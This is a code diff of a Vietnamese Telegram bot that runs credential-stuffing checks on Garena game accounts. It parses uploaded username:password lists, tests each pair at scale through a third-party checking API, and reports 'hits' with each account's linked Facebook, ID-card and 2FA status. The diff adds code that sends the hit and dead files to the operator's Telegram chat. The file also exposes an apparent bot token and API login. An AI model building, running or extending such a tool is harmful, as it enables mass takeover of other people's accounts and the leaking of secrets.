@@ -1,9 +1,6 @@
-# Bot Telegram check Garena - nhatminh301.com API
-# ĐÃ CÀI SẴN API: thaituduc / thaituduc
-# TELEGRAM TOKEN: 6367532329:AAFXK16_AaÂvANEcrqpOhb1ỉ6vOadxJ6k4U
-# ADMIN CHAT ID: 5736655322
-# CHỨC NĂNG: CHECK ĐƠN GARENA - HIỂN THỊ CHI TIẾT
-# Yêu cầu: pip install requests colorama pyTelegramBotAPI flask
+# bot.py - Garena Checker Bot - Full chức năng lọc tk mk ra txt
+# Chạy trực tiếp trên Render, không cần keepalive
+# Yêu cầu: pip install requests colorama pyTelegramBotAPI
 import requests
 import threading
 import queue
@@ -15,12 +12,8 @@ import re
 import telebot
 from datetime import datetime
 from colorama import init, Fore, Style
-from keepalive import start_keepalive
 
 init(autoreset=True)
-
-# ========== KHỞI ĐỘNG KEEPALIVE ==========
-start_keepalive()
 
 # ========== CẤU HÌNH ==========
 TELEGRAM_BOT_TOKEN = "6367532329:AAFXK16_AaÂvANEcrqpOhb1ỉ6vOadxJ6k4U"
@@ -88,11 +81,8 @@ def print_hit(msg):
 def is_admin(chat_id):
     return str(chat_id) == str(ADMIN_CHAT_ID)
 
-# ========== HÀM FORMAT KẾT QUẢ HIT GARENA ==========
+# ========== HÀM FORMAT KẾT QUẢ HIT ==========
 def format_garena_hit(username, password, data):
-    """Format kết quả hit theo mẫu Garena Checker"""
-    
-    # Lấy dữ liệu từ API, xử lý linh hoạt
     uid = data.get("uid", data.get("UID", "N/A"))
     nickname = data.get("nickname", data.get("nick", data.get("name", "N/A")))
     region = data.get("region", data.get("country", "VN"))
@@ -115,7 +105,6 @@ def format_garena_hit(username, password, data):
     cccd = data.get("cccd", data.get("cmnd", "No"))
     authen = data.get("authen", data.get("2fa", "No"))
     
-    # Xác định tình trạng
     tinh_trang = ""
     if fb != "No" and fb != "NO" and fb != "":
         tinh_trang = "Acc Có FB"
@@ -152,8 +141,9 @@ def format_garena_hit(username, password, data):
 """
     return hit_msg
 
-# ========== HÀM LỌC TÀI KHOẢN ==========
+# ========== HÀM LỌC TÀI KHOẢN TXT ==========
 def filter_accounts_txt(content):
+    """Lọc tài khoản từ nội dung, hỗ trợ nhiều format"""
     accounts = []
     seen = set()
     
@@ -171,7 +161,7 @@ def filter_accounts_txt(content):
         user = None
         pwd = None
         
-        # Hỗ trợ: user:pass, user|pass, user/pass
+        # Hỗ trợ: user:pass, user|pass, user/pass, user;pass, user,pass, user\tpass, user pass
         if ':' in line:
             parts = line.split(':', 1)
             user = parts[0].strip()
@@ -201,7 +191,11 @@ def filter_accounts_txt(content):
             user = parts[0].strip()
             pwd = parts[1].strip()
         
+        # Loại bỏ ký tự đặc biệt thừa
         if user and pwd:
+            user = re.sub(r'[^\w.@-]', '', user)
+            pwd = pwd.strip()
+            
             if len(user) > 0 and len(pwd) > 0:
                 key = f"{user}:{pwd}"
                 if key not in seen:
@@ -211,8 +205,9 @@ def filter_accounts_txt(content):
     return accounts
 
 def filter_accounts_from_file(filepath):
+    """Đọc file và lọc tài khoản"""
     try:
-        with open(filepath, 'r', encoding='utf-8') as f:
+        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
         return filter_accounts_txt(content)
     except FileNotFoundError:
@@ -222,6 +217,14 @@ def filter_accounts_from_file(filepath):
         return []
 
 def save_filtered_accounts(accounts, filepath=FILTERED_FILE):
+    """Lưu tài khoản đã lọc ra file txt"""
+    with open(filepath, 'w', encoding='utf-8') as f:
+        for user, pwd in accounts:
+            f.write(f"{user}:{pwd}\n")
+    return len(accounts)
+
+def save_accounts_to_file(accounts, filepath):
+    """Lưu danh sách tài khoản vào file txt"""
     with open(filepath, 'w', encoding='utf-8') as f:
         for user, pwd in accounts:
             f.write(f"{user}:{pwd}\n")
@@ -322,6 +325,17 @@ def save_result(category, username, password, detail):
         with open(filepath, 'a', encoding='utf-8') as f:
             f.write(f"[{timestamp}] {username}:{password} | {detail_str}\n")
 
+def save_hit_txt(username, password, detail):
+    """Lưu hit dạng txt đơn giản user:pass"""
+    detail_str = json.dumps(detail, ensure_ascii=False) if isinstance(detail, dict) else str(detail)
+    with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
+        f.write(f"{username}:{password} | {detail_str}\n")
+
+def save_dead_txt(username, password):
+    """Lưu dead dạng txt đơn giản user:pass"""
+    with open(DEAD_FILE, 'a', encoding='utf-8') as f:
+        f.write(f"{username}:{password}\n")
+
 # ========== HÀM WORKER ==========
 def worker(service, proxy, keyword):
     while not stop_event.is_set():
@@ -333,14 +347,18 @@ def worker(service, proxy, keyword):
         result = check_account_api(username, password, service, proxy, keyword)
         category, detail = parse_result(result)
         
-        save_result(category, username, password, detail)
+        if category == "hit":
+            save_hit_txt(username, password, detail)
+        elif category == "dead":
+            save_dead_txt(username, password)
+        else:
+            save_result(category, username, password, detail)
         
         with stats_lock:
             stats["checked"] += 1
             if category == "hit":
                 stats["hits"] += 1
                 
-                # Format theo mẫu Garena Checker
                 if isinstance(detail, dict):
                     hit_msg = format_garena_hit(username, password, detail)
                 else:
@@ -388,6 +406,7 @@ def start_check(chat_id, service, threads, proxy="", keyword=""):
         checking = False
         return
     
+    # Lưu tài khoản đã lọc ra txt
     save_filtered_accounts(accounts)
     
     start_msg = f"""
@@ -395,6 +414,7 @@ def start_check(chat_id, service, threads, proxy="", keyword=""):
 📋 Service: <code>{service}</code> - {SERVICE_ROUTES[service]['desc']}
 📁 Tổng account sau lọc: <code>{len(accounts)}</code>
 ⚡ Threads: <code>{threads}</code>
+📄 Lọc ra: <code>{FILTERED_FILE}</code>
 """
     if proxy:
         start_msg += f"🔌 Proxy: <code>{proxy}</code>\n"
@@ -429,9 +449,27 @@ def start_check(chat_id, service, threads, proxy="", keyword=""):
 ❌ Dead: <code>{stats['dead']}</code>
 ⚠️ Unknown: <code>{stats['unknown']}</code>
 ⏱ Thời gian: <code>{elapsed:.2f}s</code>
-📁 Hits lưu tại: <code>{OUTPUT_FILE}</code>
+📁 Hits txt: <code>{OUTPUT_FILE}</code>
+📁 Dead txt: <code>{DEAD_FILE}</code>
 """
     bot.send_message(chat_id, result_msg)
+    
+    # Tự động gửi file hits nếu có
+    if stats["hits"] > 0:
+        try:
+            with open(OUTPUT_FILE, 'rb') as f:
+                bot.send_document(chat_id, f, caption=f"📁 {stats['hits']} HITS")
+        except:
+            pass
+    
+    # Tự động gửi file dead nếu có
+    if stats["dead"] > 0:
+        try:
+            with open(DEAD_FILE, 'rb') as f:
+                bot.send_document(chat_id, f, caption=f"📁 {stats['dead']} DEAD")
+        except:
+            pass
+    
     print_success(f"Hoàn thành: {stats['hits']} hits / {stats['total']} accounts")
 
 # ========== TELEGRAM COMMANDS ==========
@@ -459,16 +497,28 @@ def cmd_start(message):
 → Check fullpack Garena
 → VD: /checkall 200
 
+📌 <b>LỆNH LỌC TK:</b>
+
+4️⃣ <b>/filter</b>
+→ Lọc tài khoản từ accounts.txt
+→ Xuất ra: filtered_accounts.txt
+
+5️⃣ <b>/list</b>
+→ Xem danh sách đã lọc
+
+6️⃣ <b>/hits</b>
+→ Xem và tải file hits.txt
+
+7️⃣ <b>/dead</b>
+→ Xem và tải file dead.txt
+
 📌 <b>LỆNH KHÁC:</b>
 
-4️⃣ <b>/filter</b> - Lọc tài khoản txt
-5️⃣ <b>/list</b> - Xem danh sách đã lọc
-6️⃣ <b>/stop</b> - Dừng check
-7️⃣ <b>/status</b> - Trạng thái check
-8️⃣ <b>/hits</b> - Xem hits
-9️⃣ <b>/services</b> - Danh sách services
-🔟 <b>/setproxy</b> &lt;ip:port&gt; - Cài proxy
-1️⃣1️⃣ <b>/setkeyword</b> &lt;từ_khóa&gt; - Keyword hotmail
+8️⃣ <b>/stop</b> - Dừng check
+9️⃣ <b>/status</b> - Trạng thái check
+🔟 <b>/services</b> - Danh sách services
+1️⃣1️⃣ <b>/setproxy</b> &lt;ip:port&gt; - Cài proxy
+1️⃣2️⃣ <b>/setkeyword</b> &lt;từ_khóa&gt; - Keyword hotmail
 
 📋 <b>SERVICES:</b>
 • <code>lienquan</code> - Liên Quân + FC Online
@@ -482,7 +532,7 @@ def cmd_start(message):
 📁 <b>GỬI FILE:</b>
 → Gửi file .txt chứa accounts
 → Format: <code>user:pass</code> hoặc <code>user|pass</code> hoặc <code>user/pass</code>
-→ Bot tự động lọc và gửi file đã lọc
+→ Bot tự động lọc và gửi file filtered_accounts.txt
 """
     bot.send_message(message.chat.id, help_text)
 
@@ -504,7 +554,6 @@ def cmd_services(message):
 
 @bot.message_handler(commands=['check1'])
 def cmd_check1(message):
-    """Check 1 tài khoản Garena đơn lẻ"""
     if not is_admin(message.chat.id):
         return
     
@@ -537,6 +586,7 @@ def cmd_check1(message):
 📋 {detail[:500]}
 ━━━━━━━━━━━━━━━━━━━━━━━━━
 """
+            save_hit_txt(username, password, detail)
         elif category == "dead":
             hit_msg = f"""
 ━━━━━━━━━ ❌ <b>DEAD</b> ━━━━━━━━━
@@ -544,6 +594,7 @@ def cmd_check1(message):
 📋 {detail[:200]}
 ━━━━━━━━━━━━━━━━━━━━━━━━━
 """
+            save_dead_txt(username, password)
         else:
             hit_msg = f"""
 ━━━━━━━━━ ⚠️ <b>UNKNOWN</b> ━━━━━━━━━
@@ -551,8 +602,8 @@ def cmd_check1(message):
 📋 {detail[:200]}
 ━━━━━━━━━━━━━━━━━━━━━━━━━
 """
+            save_result(category, username, password, detail)
         
-        save_result(category, username, password, detail)
         bot.send_message(message.chat.id, hit_msg)
     
     threading.Thread(target=do_check).start()
@@ -619,6 +670,7 @@ def cmd_checkall(message):
 
 @bot.message_handler(commands=['filter'])
 def cmd_filter(message):
+    """Lọc tài khoản từ accounts.txt ra filtered_accounts.txt"""
     if not is_admin(message.chat.id):
         return
     
@@ -628,13 +680,13 @@ def cmd_filter(message):
         accounts = filter_accounts_from_file(INPUT_FILE)
         
         if not accounts:
-            bot.send_message(message.chat.id, f"❌ <b>Không có tài khoản hợp lệ!</b>\nFormat: <code>user:pass</code> hoặc <code>user|pass</code> hoặc <code>user/pass</code>")
+            bot.send_message(message.chat.id, f"❌ <b>Không có tài khoản hợp lệ!</b>\nFile: <code>{INPUT_FILE}</code>\nFormat: <code>user:pass</code> hoặc <code>user|pass</code> hoặc <code>user/pass</code>")
             return
         
         count = save_filtered_accounts(accounts)
         
         try:
-            with open(INPUT_FILE, 'r', encoding='utf-8') as f:
+            with open(INPUT_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                 total_lines = sum(1 for line in f if line.strip())
         except:
             total_lines = 0
@@ -645,16 +697,20 @@ def cmd_filter(message):
 ✅ Hợp lệ: <code>{count}</code>
 ❌ Bị loại: <code>{total_lines - count}</code>
 📁 Đã lưu: <code>{FILTERED_FILE}</code>
+
+<b>Dùng /list để xem chi tiết</b>
 """
         bot.send_message(message.chat.id, result_msg)
         
+        # Gửi file đã lọc
         with open(FILTERED_FILE, 'rb') as f:
-            bot.send_document(message.chat.id, f, caption=f"📁 {count} tài khoản đã lọc")
+            bot.send_document(message.chat.id, f, caption=f"📁 {count} tài khoản đã lọc (user:pass)")
     
     threading.Thread(target=do_filter).start()
 
 @bot.message_handler(commands=['list'])
 def cmd_list(message):
+    """Xem danh sách tài khoản đã lọc"""
     if not is_admin(message.chat.id):
         return
     
@@ -673,6 +729,7 @@ def cmd_list(message):
         
         msg = f"""
 📋 <b>DANH SÁCH TÀI KHOẢN ĐÃ LỌC</b>
+📁 File: <code>{FILTERED_FILE}</code>
 📄 Tổng: <code>{total}</code>
 
 <b>20 dòng đầu:</b>
@@ -683,9 +740,9 @@ def cmd_list(message):
         
         bot.send_message(message.chat.id, msg)
         
-        if total > 20:
-            with open(FILTERED_FILE, 'rb') as f:
-                bot.send_document(message.chat.id, f, caption=f"📁 Toàn bộ {total} tài khoản")
+        # Gửi file đầy đủ
+        with open(FILTERED_FILE, 'rb') as f:
+            bot.send_document(message.chat.id, f, caption=f"📁 Toàn bộ {total} tài khoản đã lọc")
     
     except FileNotFoundError:
         bot.reply_to(message, "❌ <b>Chưa có file đã lọc!</b>\nDùng /filter hoặc gửi file txt")
@@ -727,21 +784,67 @@ def cmd_status(message):
 
 @bot.message_handler(commands=['hits'])
 def cmd_hits(message):
+    """Xem và tải file hits.txt"""
     if not is_admin(message.chat.id):
         return
     try:
-        with open(OUTPUT_FILE, 'r', encoding='utf-8') as f:
+        with open(OUTPUT_FILE, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
+        
         if content:
-            if len(content) > 4000:
-                with open(OUTPUT_FILE, 'rb') as f:
-                    bot.send_document(message.chat.id, f, caption="📁 <b>File hits</b>")
-            else:
-                bot.send_message(message.chat.id, f"📁 <b>HITS:</b>\n<code>{content}</code>")
+            lines = content.strip().split('\n')
+            total = len(lines)
+            
+            preview = '\n'.join(lines[:20])
+            
+            msg = f"""
+📁 <b>FILE HITS.TXT</b>
+📄 Tổng: <code>{total}</code>
+
+<b>20 dòng đầu:</b>
+<code>{preview}</code>
+"""
+            bot.send_message(message.chat.id, msg)
+            
+            # Gửi file hits.txt
+            with open(OUTPUT_FILE, 'rb') as f:
+                bot.send_document(message.chat.id, f, caption=f"📁 hits.txt ({total} hits)")
         else:
             bot.reply_to(message, "❌ <b>Chưa có hits!</b>")
     except FileNotFoundError:
-        bot.reply_to(message, "❌ <b>Chưa có file hits!</b>")
+        bot.reply_to(message, "❌ <b>Chưa có file hits.txt!</b>")
+
+@bot.message_handler(commands=['dead'])
+def cmd_dead(message):
+    """Xem và tải file dead.txt"""
+    if not is_admin(message.chat.id):
+        return
+    try:
+        with open(DEAD_FILE, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+        
+        if content:
+            lines = content.strip().split('\n')
+            total = len(lines)
+            
+            preview = '\n'.join(lines[:20])
+            
+            msg = f"""
+📁 <b>FILE DEAD.TXT</b>
+📄 Tổng: <code>{total}</code>
+
+<b>20 dòng đầu:</b>
+<code>{preview}</code>
+"""
+            bot.send_message(message.chat.id, msg)
+            
+            # Gửi file dead.txt
+            with open(DEAD_FILE, 'rb') as f:
+                bot.send_document(message.chat.id, f, caption=f"📁 dead.txt ({total} dead)")
+        else:
+            bot.reply_to(message, "❌ <b>Chưa có dead!</b>")
+    except FileNotFoundError:
+        bot.reply_to(message, "❌ <b>Chưa có file dead.txt!</b>")
 
 @bot.message_handler(commands=['setproxy'])
 def cmd_setproxy(message):
@@ -775,6 +878,7 @@ def cmd_setkeyword(message):
 
 @bot.message_handler(content_types=['document'])
 def handle_document(message):
+    """Nhận file txt và tự động lọc tk mk"""
     if not is_admin(message.chat.id):
         return
     
@@ -782,68 +886,81 @@ def handle_document(message):
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         
+        # Lưu file gốc
         with open(INPUT_FILE, 'wb') as f:
             f.write(downloaded_file)
         
+        # Đọc nội dung
         content = downloaded_file.decode('utf-8', errors='ignore')
         
+        # Lọc tài khoản
         accounts = filter_accounts_txt(content)
         
         if not accounts:
             bot.reply_to(message, f"❌ <b>Không có tài khoản hợp lệ!</b>\nFormat: <code>user:pass</code> hoặc <code>user|pass</code> hoặc <code>user/pass</code>")
             return
         
+        # Lưu file đã lọc
         count = save_filtered_accounts(accounts)
         
+        # Đếm số dòng gốc
         total_lines = sum(1 for line in content.split('\n') if line.strip())
         
         result_msg = f"""
 ✅ <b>ĐÃ NHẬN FILE VÀ LỌC TÀI KHOẢN!</b>
+📁 File gốc: <code>{message.document.file_name}</code>
 📄 Tổng dòng: <code>{total_lines}</code>
 ✅ Hợp lệ: <code>{count}</code>
 ❌ Bị loại: <code>{total_lines - count}</code>
 
-<b>Dùng:</b>
+📁 <b>File đã lọc:</b> <code>{FILTERED_FILE}</code>
+
+<b>Dùng lệnh:</b>
 /check1 &lt;service&gt; &lt;user&gt; &lt;pass&gt; - Check đơn
 /check &lt;service&gt; &lt;threads&gt; - Check danh sách
+/list - Xem danh sách đã lọc
 """
         bot.reply_to(message, result_msg)
         
+        # Gửi file đã lọc
         with open(FILTERED_FILE, 'rb') as f:
-            bot.send_document(message.chat.id, f, caption=f"📁 {count} tài khoản đã lọc")
+            bot.send_document(message.chat.id, f, caption=f"📁 {count} tài khoản đã lọc (user:pass)")
     
     except Exception as e:
         bot.reply_to(message, f"❌ <b>Lỗi xử lý file:</b> {e}")
 
 @bot.message_handler(content_types=['text'])
 def handle_text(message):
+    """Nhận text và lọc tk mk"""
     if not is_admin(message.chat.id):
         return
     
     if message.text.startswith('/'):
         return
     
-    # Tự động nhận diện format user:pass hoặc user|pass hoặc user/pass
+    # Lọc tài khoản từ text
     accounts = filter_accounts_txt(message.text)
     
     if not accounts:
         return
     
+    # Thêm vào file accounts.txt
     with open(INPUT_FILE, 'a', encoding='utf-8') as f:
         for user, pwd in accounts:
             f.write(f"{user}:{pwd}\n")
     
+    # Lọc lại toàn bộ và lưu filtered
     all_accounts = filter_accounts_from_file(INPUT_FILE)
     count = save_filtered_accounts(all_accounts)
     
-    bot.reply_to(message, f"✅ <b>Đã lọc:</b> <code>{len(accounts)}</code> tài khoản\n📁 Tổng trong file: <code>{count}</code>")
-    bot.reply_to(message, "Dùng /check1 &lt;service&gt; &lt;user&gt; &lt;pass&gt; để check đơn")
+    bot.reply_to(message, f"✅ <b>Đã lọc:</b> <code>{len(accounts)}</code> tài khoản từ tin nhắn\n📁 Tổng trong file: <code>{count}</code>")
+    bot.reply_to(message, "📁 File: filtered_accounts.txt\nDùng /list để xem")
 
 def main():
     print(f"{Fore.CYAN}{'='*60}")
     print(f"{Fore.CYAN}    GARENA CHECKER BOT - NHATMINH301")
     print(f"{Fore.CYAN}    API: thaituduc / KHÔNG GIỚI HẠN")
-    print(f"{Fore.CYAN}    KEEPALIVE: PORT 8080")
+    print(f"{Fore.CYAN}    LỌC TK MK RA TXT")
     print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
     print()
     
